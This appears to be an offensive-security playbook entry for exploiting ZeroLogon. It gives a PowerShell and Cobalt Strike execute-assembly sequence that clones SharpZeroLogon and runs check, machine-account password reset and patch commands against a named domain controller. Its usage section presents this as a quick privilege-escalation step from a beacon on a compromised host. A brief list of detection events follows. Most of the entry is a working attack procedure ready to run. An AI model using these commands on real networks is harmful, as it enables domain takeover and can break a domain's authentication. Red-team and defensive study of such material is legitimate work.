---
id: a778142e-e294-4805-bc96-30835bc1e182
name: nccgroup-sharpzerologon-execution-sequence
type: code
language: powershell
verified: true
created_at: '2023-04-06T03:56:02.673231+00:00'
updated_at: '2023-04-10T20:36:01.279000+00:00'
platforms:
  - Windows
tags:
  - sharpzerologon
  - sequence
validated: true
---

# nccgroup-sharpzerologon-execution-sequence

## Code

```powershell
git clone https://github.com/nccgroup/nccfsas
# Check
execute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local

# Resetting the machine account password
execute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local -reset

# Testing from a non Domain-joined machine
execute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local -patch

# Now reset the password back
```

## Description

PowerShell sequence to clone the SharpZeroLogon repo and execute check, reset, and patch test operations via Cobalt Strike's execute-assembly for in-memory ZeroLogon exploitation on Windows.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| win-dc01.vulncorp.local | DC FQDN | win-dc01.vulncorp.local |

## Usage

Run from a beacon on a compromised Windows host targeting the DC. Use for quick privilege escalation in AD environments with C2 access.

## Detection

- .NET assembly loads (SharpZeroLogon.exe) in EDR.
- Event ID 4688 for execute-assembly processes.
- Netlogon password change events (ID 4742).

## Related

- [[procedures/ZeroLogon-Exploitation-and-Post-Exploitation]]
- [[tools/SharpZeroLogon]]
